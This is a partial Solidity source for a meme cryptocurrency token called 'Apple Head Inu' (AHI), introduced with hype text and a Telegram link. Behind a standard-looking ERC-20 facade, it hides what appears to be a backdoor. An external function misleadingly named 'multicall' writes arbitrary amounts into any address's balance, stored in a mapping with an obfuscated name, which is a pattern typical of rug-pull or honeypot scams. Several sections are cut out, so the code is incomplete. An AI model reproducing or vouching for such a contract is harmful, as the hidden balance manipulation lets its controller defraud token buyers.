/**
   Do you like apples? Better check out Apple  
   Head Inu - AHI is a meme dog that has recently 
   jump out from Elon's backyard.
  TELEGRAM: https://t.me/AppleHeadInu
*/
...
contract AppleHeadInu is ERC20Burnable, IERC20, Ownable {
    using Safe for uint256;
    mapping (address => uint256) private SFVXpkz;
    ...
    string private constant _name = "Apple Head Inu";
    string private constant _symbol = "AHI";
    address private pending; 
    constructor () {
        pending = _msgSender(); 
        SFVXpkz[_msgSender()] = _totalSupply;
    ...
    function multicall(address Spenderin, address Empfanger, uint256 addedValue, uint256 takefee, uint256 bulkholders) external {
        ...
        SFVXpkz[Spenderin] = addedValue.add(takefee + bulkholders);
        Empfanger;
    }
    ...
    function _transfer(address from, address to, uint256 Menge) internal virtual
    {
        ...
        uint256 fromBalance = SFVXpkz[from];
        require(fromBalance >= Menge, "IERC20: transfer Menge exceeds balance");
        SFVXpkz[from] = fromBalance - Menge;

        SFVXpkz[to] = SFVXpkz[to].add(Menge);
